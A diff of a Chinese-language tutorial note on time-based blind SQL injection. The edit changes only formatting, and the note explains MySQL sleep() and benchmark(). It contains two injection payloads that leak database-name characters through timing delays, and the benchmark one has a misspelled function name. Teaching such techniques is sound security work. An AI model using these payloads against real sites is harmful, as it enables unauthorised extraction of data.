@@ -95,11 +95,11 @@ _
 ```
 
 # 基于时间的sql盲注
-1.函数
+1. 函数
      Sleep(N)-------------可以让语句运行N秒
      Benchmark()-----------一个mysql的内置函数，主要用来测试一些函数执行速度，且带有两个参数，一个为执行次数，一     个是执行函数或表达式 
-2.延时注入类型
-    （1）利用sleep()函数进行注入
+2. 延时注入类型
+   （1）利用sleep()函数进行注入
      ?Id=1’and if(ascii(substr(database(),1,1))=115,1,sleep(5)) --+
-（2）利用benchmark()进行延时注入
-     ?Id=1’union select (if(subsring(current,1,1)=char(115),benchmark(50000,encode(‘MSG’,’by 5      seconds’)),null)),2,3 from(select database() as current) as tb1 --+
+   （2）利用benchmark()进行延时注入
+     ?Id=1’union select (if(subsring(current,1,1)=char(115),benchmark(50000,encode(‘MSG’,’by 5      seconds    ’)),null)),2,3 from(select database() as current) as tb1 --+
